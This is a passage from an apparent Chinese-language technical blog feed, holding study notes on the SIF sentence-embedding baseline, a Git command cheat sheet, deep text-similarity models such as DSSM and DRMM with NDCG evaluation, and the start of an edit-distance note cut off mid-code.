src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1-CapsuleNet和动态路由.assets/image-20191110153837670.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="problems">Problems</span></h3><ol type="1"><li>Optimizing routing</li><li>当存在较多class时，参数量很大</li><li>不能驾驭大规模数据集</li></ol><h3><span id="resources">Resources</span></h3><ol type="1"><li><a href="https://www.crcv.ucf.edu/cvpr2019-tutorial/resources.html">CVPR2019Tutorial</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> capsule </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Sentence Embedding Baseline</title>
      <link href="/posts/8be3b59a.html"/>
      <url>/posts/8be3b59a.html</url>
      
        <content type="html"><![CDATA[<p>论文<a href="https://openreview.net/pdf?id=SyK00v5xx" target="_blank" rel="noopener">《A SIMPLE BUTTOUGH-TO-BEAT BASELINE FOR SENTENCE EMBEDDINGS》</a></p><h2><span id="info">Info:</span></h2><ul><li>类别: [engineering ; pragmatic]</li><li>研究目标<ul><li>提升Towards universal paraphrastic sentence embeddings（JohnWieting, Mohit Bansal, Kevin Gimpel, and Karen Livescu.）论文提出的监督学习方法，转而进行无监督学习。</li><li>提升基于word embedding的句子向量的表现力。</li></ul></li><li>研究成果：<ul><li>completely unsupervised sentence embedding</li><li>improves performance by about 10% to 30% in textual similaritytasks, and beats sophisticated supervised methods including RNN’s andLSTM’s.</li><li>new “smoothing” terms that allow for words occurring out of context,as well as high probabilities for words like and, not in allcontexts.</li></ul></li><li>存在的问题：<ul><li>在sentiment相关任务上，效果一般，与LSTM相差较大。</li><li>在下游任务为监督学习任务时，效果一般，没有LSTM、Skip-thought等方法有效。</li></ul></li><li>关键词：sentence embedding，无监督学习</li></ul><h2><span id="brief-summary">Brief Summary:</span></h2><p>这项工作提供了一种简单的句子嵌入方法，基于随机游走模型生成句子文本(Aroraet al.，2016)。它简单且无监督，但在各种文本相似性任务上，它的性能明显优于基线，甚至可以击败一些复杂的监督方法，如RNN和LSTM模型。获得的embedding可以作为下游监督任务的特征，与复杂方法相比也能获得不错的结果。</p><hr><h2><span id="main-thought">Main Thought:</span></h2><p>简单且无监督的Sentence embeddings计算方法。</p><ul><li><p>在 textual similaritytasks上，当选取了合适参数，效果相比于词向量的简单平均、LSTM、Skip-thought等方法有一定提升。</p><ul><li><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BASELINE%20%20FOR%20SENTENCE%20EMBEDDINGS.assets/image-20200504103138652.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure></li><li>上图b中，在不同的领域都是有用的。这对于无监督方法尤其重要，因为未标记的可用数据可以从目标应用程序的不同域中收集。</li></ul></li><li><p>在下游任务为监督学习任务时，效果下降的原因</p><ul><li>这可能是因为similarity任务直接依靠余弦相似性,这使得该方法倾向于removing the commoncomponents(可视为一种去噪denoising)。</li><li>而在监督任务, 由于有一些标签的信息用于训练,分类器可以挑出有用少见的components和忽视常见的components。</li></ul></li><li><p>无视词序</p><ul><li><p>然而基于LSTM、RNN的结果表明，词序在similarity任务上是有作用的。本文方法忽视了次序，可以考虑两者结合。</p></li><li><p>忽略词序的方法，更能找到sentiment层面的信息。</p></li><li><blockquote><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BASELINE%20%20FOR%20SENTENCE%20EMBEDDINGS.assets/image-20200504102856357.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure></blockquote></li></ul></li><li><p>与Word2vec的联系</p><ul><li>Word2vec使用子采样（sub-sampling）技术对单词w进行下采样，概率与1/√p（w）成正比，其中p（w）是单词w的边缘概率。这种启发式方法不仅可以加快训练速度，而且学习了更常见的单词表示形式。</li><li>该文章模型中，对词向量进行隐式加权，因此在一些场景下可以更好的利用文档的统计信息。</li></ul></li></ul><h2><span id="method">Method</span></h2><ol type="1"><li>latent variable generative model for text</li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BASELINE%20%20FOR%20SENTENCE%20EMBEDDINGS.assets/image-20200504105401942.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p><span class="math inline">\(c_t\)</span>为来自latent randomwalk的句子向量。使用MAP方法预测下一个（time t）生成的词的概率。</p><ol start="2" type="1"><li>Improved Random Walk model.</li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BASELINE%20%20FOR%20SENTENCE%20EMBEDDINGS.assets/image-20200504105656662.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>添加两个smooth项。<span class="math inline">\(p(w)\)</span>:即使单词的向量与<span class="math inline">\(c_s\)</span>的内积非常低，单词也可能出现。<span class="math inline">\(c_0\)</span>:与语法相关的sentence向量校正项，保证最重要的向量维度处于主导地位。它提高了与<span class="math inline">\(c_0\)</span>方向相近的单词在模型中的共现概率。</p><ol start="3" type="1"><li>Computing the sentence embedding</li></ol><p>假设<span class="math inline">\(Z\)</span>是一个常量</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BASELINE%20%20FOR%20SENTENCE%20EMBEDDINGS.assets/image-20200504111502500.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>越常见的word <span class="math inline">\(w\)</span>，权重<span class="math inline">\(a/(p(w)+a)\)</span>就越小，可以使embedding专注于具有代表性的词。</p><p>为了删去没有代表性的信息，计算<span class="math inline">\(c_0\)</span>的方向为<img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BASELINE%20%20FOR%20SENTENCE%20EMBEDDINGS.assets/image-20200504112151856.png" srcset="/img/loading.gif" lazyload alt="image">矩阵的第一个主成分（不进行 centralizing）。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/BASELINE%20%20FOR%20SENTENCE%20EMBEDDINGS.assets/image-20200504111108410.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h2><span id="notes">Notes:</span></h2><ol type="1"><li><p>PMI: Pointwise Mutual Information <span class="math display">\[PMI = log \frac{p(u, v)}{p(u)p(v)}\]</span></p></li><li><p>pPMI = max(0,PMI): positive Pointwise Mutual Information</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sentence embedding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git sheet</title>
      <link href="/posts/cdcb5601.html"/>
      <url>/posts/cdcb5601.html</url>
      
        <content type="html"><![CDATA[<h3><span id="basic">basic</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ git status                                    <span class="hljs-comment"># 检查文件当前的状态</span><br>$ git add [文件名]                               <span class="hljs-comment"># 追踪新的文件</span><br>$ git diff --cached                             <span class="hljs-comment"># 若要看已经暂存起来的文件和上次提交时的快照之间的差异</span><br>$ git commit -m <span class="hljs-string">"Story 182: Fix benchmark"</span>      <span class="hljs-comment"># 用一行命令提交更新</span><br>$ git commit -a -m <span class="hljs-string">'added new benchmarks'</span>       <span class="hljs-comment"># 跳过add命令直接提交</span><br>$ git rm --cached log.log                       <span class="hljs-comment"># 从git仓库中删除不小心追踪的文件（用于gitignore之前追踪的文件）                   </span><br>$ git mv file_from file_to                      <span class="hljs-comment"># 移动文件/重命名文件</span><br>$ git <span class="hljs-built_in">log</span>          ​                            <span class="hljs-comment"># 查看历史操作</span><br></code></pre></div></td></tr></table></figure><h3><span id="关联远程仓库">关联远程仓库</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ git init                                      <span class="hljs-comment"># 初始化这个本地的文件夹为一个Git可以管理的仓库</span><br>$ git remote add origin https://[地址]               <span class="hljs-comment"># 将本地的仓库和远程的仓库进行关联</span><br>$ git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;   <span class="hljs-comment"># git pull origin master:master</span><br>$ git add<br>$ git commit -m<br>$ git push -u origin master(首次关联加u，后续不用)<br>$ git push origin master<br>$ git <span class="hljs-built_in">clone</span> https://github.com/。。。<br><br><br>$ git rm --cached <span class="hljs-string">"文件路径"</span>，不删除物理文件，仅将该文件从缓存中删除<br>$ git rm --f <span class="hljs-string">"文件路径"</span>，不仅将该文件从缓存中删除，还会将物理文件删除（不会回收到垃圾桶）<br>$ git commit -m <span class="hljs-string">"delete file"</span><br>$ git push<br></code></pre></div></td></tr></table></figure><h3><span id="branch">branch</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"> git branch                                    <span class="hljs-comment"># 查看分支</span><br>$ git branch new-branch-name      <span class="hljs-comment"># 创建新分支</span><br>$ git branch -v                                 <span class="hljs-comment"># 查看各分支最后一个提交对象</span><br>$ git branch --merged                           <span class="hljs-comment"># 查看已经merge过的分支</span><br>$ git branch --no-merged                        <span class="hljs-comment"># 尚未merge的分支</span><br>$ git branch -d testing                         <span class="hljs-comment"># 删除掉分支(如果还没有merge,会出现错误,-D可以强制删除)</span><br><br>$ git branch -a                                 <span class="hljs-comment"># 查看所有分支（包括远程服务器）</span><br>$ git push [远程仓库名] [本地分支名]:[远程分支名]  <span class="hljs-comment"># 推送本地分支到远程分支</span><br>                                                <span class="hljs-comment"># 如果本地分支名为空，则会直接删除远程分支名</span><br>$ git checkout -b iss53                         <span class="hljs-comment"># 新建分支并切换到新分支 =$ git branch iss53; git checkout iss53</span><br>$ git reset 版本号<br>$ git cherry-pick [id]                          <span class="hljs-comment"># 合并某一个单独的commit</span><br><br><span class="hljs-comment"># 创建并在branch上修改之后，在代码仓库界面，可以在pull request选项中，选择是否merge pull request，合并该分支的修改</span><br></code></pre></div></td></tr></table></figure><h3><span id="organization">organization</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 远程创建organization：New organization</span><br><br><span class="hljs-comment"># organization中选择Team，创建管理小组</span><br><br><span class="hljs-comment"># 新建代码仓库，归属于organization，在setting中设置Team权限，合作者权限</span><br><br><span class="hljs-comment"># pull request中加入@TeamName可以通知所有人</span><br></code></pre></div></td></tr></table></figure><h3><span id="opensource">opensource</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 添加LICENSE，可使用template模板创建</span><br><br><span class="hljs-comment"># 贡献开源项目，可以首先查看issue中是否有已经出现的相同问题</span><br><br><span class="hljs-comment"># fork仓库，然后git clone到本地</span><br><br>$ git checkout -b fix-bug                  <span class="hljs-comment"># 新建分支并切换到新分支</span><br><br><span class="hljs-comment"># 修改</span><br><br>$ git add .<br>$ git commit -m <span class="hljs-string">"message"</span><br>$ git push origin fix-bug<br><br><span class="hljs-comment"># 在fork项目中 点击New pull request，向原项目提交更改</span><br></code></pre></div></td></tr></table></figure><h3><span id="log">log</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ git <span class="hljs-built_in">log</span> --pretty=format:<span class="hljs-string">"%h - %an, %ar : %s"</span>  <span class="hljs-comment"># 用特性的format查看log</span><br>$ git <span class="hljs-built_in">log</span> --graph                               <span class="hljs-comment"># 用图表的形式显示git的合并历史</span><br></code></pre></div></td></tr></table></figure><h3><span id="config">config</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ git config --global user.name <span class="hljs-string">"John Doe"</span>      <span class="hljs-comment"># 配置用户名 ！仅第一次必须</span><br>$ git config --global user.email je@example.com <span class="hljs-comment"># 配置电邮 ！仅第一次必须</span><br>$ git config --list                             <span class="hljs-comment"># 查看配置信息</span><br>$ git config --global alias.stash-unapply <span class="hljs-string">'!git stash show -p | git apply -R'</span> <span class="hljs-comment"># 设置别名</span><br></code></pre></div></td></tr></table></figure><h3><span id="stash">stash</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ git stash                                     <span class="hljs-comment"># 储藏当前工作内容</span><br>$ git stash list                                <span class="hljs-comment"># 查看所有已经储藏的内容</span><br>$ git stash apply  [stash@&#123;0&#125;]                  <span class="hljs-comment"># 在当前工作区应用储藏的内容，默认最新</span><br>$ git stash apply --index                       <span class="hljs-comment"># 在当前工作区应用储藏的内容，并保持之前暂存区的状态</span><br>$ git stash drop                                <span class="hljs-comment"># 删除一个储藏</span><br>$ git stash pop                                 <span class="hljs-comment"># 弹出一个储藏</span><br></code></pre></div></td></tr></table></figure><h3><span id="rejected问题">rejected问题</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 通常是因为在远程仓库中更改了，而本地没有修改，造成冲突。一般先在本地先pull再push，不会出现这样的问题。</span><br><br>$ git fetch origin<br>$ git rebase origin/master<br>$ git push<br></code></pre></div></td></tr></table></figure><h3><span id="ssh密匙问题没有权限访问仓库">ssh密匙问题，没有权限访问仓库</span></h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 重新设置ssh key</span><br><br>git config --global user.name  <span class="hljs-string">'racleray'</span><br>git config --global user.email <span class="hljs-string">'racleme@outlook.com'</span><br>ssh-keygen -t rsa -C  <span class="hljs-string">'racleme@outlook.com'</span><br><br><span class="hljs-comment"># 在home目录找 .ssh/id_rsa.pub</span><br><br><span class="hljs-comment"># 在github网站的SSH keys添加new key</span><br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本相似性深度学习方法</title>
      <link href="/posts/bad75bd3.html"/>
      <url>/posts/bad75bd3.html</url>
      
        <content type="html"><![CDATA[<p>基于深度学习的语义匹配方法一般有两种类型：</p><ul><li>Representation-based Match：简单，速度快。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229123435028.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><ul><li>Interaction-based Match：计算相对复杂，参数空间也更大。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229123457321.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><h3><span id="representation-based">Representation-based</span></h3><p>Representation-based Match句子相似度计算的一般训练流程如下：</p><ol type="1"><li><p>准备同义句数据集（比如，The ParaphraseDatabase，ParaNMT-50M）；</p></li><li><p>选择模型结构（比如，Word Averaging，BiLSTM Averaging等）；</p><ul><li>Word Averaging模型：平均句子中的所有词向量作为句子语义的表达</li><li>BiLSTMAveraging模型：合并前向和反向LSTM编码得到的隐向量作为句子语义的表达</li><li>相对进阶一点的模型有InferSent，DSSM，CDSSM</li></ul></li><li><p>选择负样本：</p><ul><li>从当前batch中寻找与当前句子意义（根据当前模型判断）最不相近的句子。</li><li>或者，Mega-batching：从更大的样本（合并多个mini batches）中寻找意义较远的句子。</li></ul></li><li><p>优化目标：hinge loss</p><ul><li><span class="math display">\[\begin{array}{l}\min _{W_{c}, W_{w}} \frac{1}{|S|}\left(\sum_{\left\langle s_{1},s_{2}\right\rangle \in S} \max \left(0, \delta-\cos\left(g\left(s_{1}\right), g\left(s_{2}\right)\right)\right.\right. \\\left.+\cos \left(g\left(s_{1}\right),g\left(t_{1}\right)\right)\right)+\max \left(0, \delta-\cos\left(g\left(s_{1}\right), g\left(s_{2}\right)\right)\right. \\\left.\left.+\cos \left(g\left(s_{2}\right),g\left(t_{2}\right)\right)\right)\right)+\lambda_{c}\left\|W_{c}\right\|^{2}+\lambda_{w}\left\|W_{w_{\text{initial}}}-W_{w}\right\|^{2}\end{array}\]</span></li></ul><p>s之间正样本相似度要尽量接近<span class="math inline">\(\delta\)</span>，与负样本t之间相似度要尽量大。同时在正则化中加入词向量变化约束，计算之后的词向量不能和初始化使用的Glove（或其他）词向量相差过大。</p></li></ol><h4><span id="infersent">InferSent</span></h4><p>​ <a href="https://github.com/facebookresearch/InferSent" target="_blank" rel="noopener">InferSentGit</a></p><p>​ 给定两个句子，预测两个句子之间的关系 (entailment隐含,contradiction互斥, neutral无关)，即预测三种概率。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229135253619.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ encoder作为语句特征的提取器。</p><p>​ 训练时，若只为学习sentencerepresentation，线性分类器也许会得到比较好的效果。为了达到更好的分类效果，可以采用更复杂的非线性分类器。</p><h4><span id="dssmdeep-structuredsemantic-model">DSSM(Deep StructuredSemantic Model)</span></h4><p>​微软研究院使用，用户搜索的关键词和最终点开的网页标题组成的数据，训练相似度计算模型。DSSM将语句映射到语义空间的连续表示，计算相似性。</p><h5><span id="word-hashing">Word Hashing</span></h5><p>• 用于解决单词表和out of vocabulary问题 • 把单词(e.g. good)前后加上#(#good#) • 然后取所有的trigram (#go, goo, ood, od#)，表示成bag oftrigram 向量</p><p>​ 原词表转换为了Compact representation，大小会变小，节省了空间。</p><p>​ 对拼写错误有一定鲁棒性。</p><p>​ 在大型NLP任务中可以轻松使用。</p><h5><span id="模型">模型</span></h5><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229143653433.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229143732062.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>训练目标：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229143907531.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h5><span id="cdssm">CDSSM</span></h5><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229144239695.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ convolutionallayer捕捉了局部上下文的含义。那么相同单词在不同上下文中的多义性，就可能通过模型捕捉。</p><p>​ global pooling捕捉语句整体的意图。实验中，一般情况下maxpooling能够较准确地提取出整体语义。</p><h5><span id="recurrent-dssm">Recurrent DSSM</span></h5><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229145347251.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​对比Seq2Seq，DSSM倾向于在语句语义空间内优化，而Seq2Seq更倾向于在word-level进行学习优化。</p><h5><span id="评价指标">评价指标</span></h5><p>​ NDCG a measure of ranking quality.</p><p>​ 两个基本假设：</p><blockquote><ol type="1"><li>相关度越高，排名越高。</li><li>高度相关的排名高于部分相关，部分相关的排名高于无关。</li></ol></blockquote><h6><span id="cumulative-gain">Cumulative Gain</span></h6><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229165603261.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ <span class="math inline">\(rel_i\)</span> --是相关度分数，比如，第i个结果高度相关为5分</p><h6><span id="discounted-cumulative-gain">Discounted Cumulative Gain</span></h6><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229165802242.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 对高度相关的结果出现在ranking靠后位置时，进行惩罚。</p><p>​ 另一个形式为：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229170431528.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 这个形式相对比较常用。</p><h6><span id="ndcgnormalizeddiscounted-cumulative-gain">NDCG：normalizeddiscounted cumulative gain</span></h6><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229170809101.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229170823985.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h6><span id="example">Example</span></h6><p>​ 令0 -- 不相关，1，2 -- 不同程度部分相关，3 --高度相关。相关性算法排序了前6个结果，降序：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229171442666.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 而用户数据中的相关性分数GroundTruth为，每个位置index代表一个语句：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229171550873.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ Cumulative Gain，简单相加：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229171747927.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ Discounted Cumulative Gain，DCG结果为：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229173915052.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229171915494.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ NDCG的IDCG，为期望的相关性排列顺序，即期望的最优输出：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229173842066.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229173931273.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229174016420.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h4><span id="dssm的其他应用">DSSM的其他应用</span></h4><ol type="1"><li>训练word embedding：上下文与中心词的语义相似性<ul><li><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229174248220.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></li></ul></li><li>Knowledge Base Embedding学习</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229174559343.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:40%;"></p><ol start="3" type="1"><li>QA</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229174710038.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><ol start="4" type="1"><li>Information Retrieval</li><li>Contextual Entity Ranking</li></ol><h3><span id="interaction-based-matching">Interaction-based Matching</span></h3><h4><span id="drmmdeep-relevance-matchingmodel">DRMM：Deep Relevance MatchingModel</span></h4><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229175747727.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​输入网络的特征是处理过的，把matching分数转化为histogram统计特征：</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229175856441.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 即q的term与d计算cosinesimilarity，不是乘法，然后统计多个不同区间的相似度的统计分布。</p><h5><span id="term-gating-network">Term Gating Network</span></h5><p>​ Term Gating Network用于计query中每个term的weight。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229180448787.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h5><span id="hinge-loss">Hinge loss</span></h5><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/深度学习相似性模型.assets/image-20200229180545407.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSSM </tag>
            
            <tag> CDSSM </tag>
            
            <tag> text similarity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文本相似性</title>
      <link href="/posts/1074fc0d.html"/>
      <url>/posts/1074fc0d.html</url>
      
        <content type="html"><![CDATA[<h2><span id="基于字符串匹配的文本相似度">基于字符串匹配的文本相似度</span></h2><ol type="1"><li>Hamming distance</li></ol><p>​ 两个相同长度的字符串，有多少个位置是不同的token. e.g., d(cap, cat) =1</p><ol start="2" type="1"><li>编辑距离</li></ol><p>​给定两个句子，最少需要经过多少步操作（删除，添加，替换）能够从一个句子转化成另一个句子</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/文本相似性.assets/image-20200228225047923.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">editDistDP</span><span class="hljs-params">(s1, s2)</span>:</span> <br>    <span class="hljs-string">"""编辑距离计算</span><br><span class="hljs-string">    params：文本1，string</span><br><span class="hljs-string">            文本2，string</span><br><span class="hljs-string">    """</span><br>    m = len(s1.strip())<br>    n = 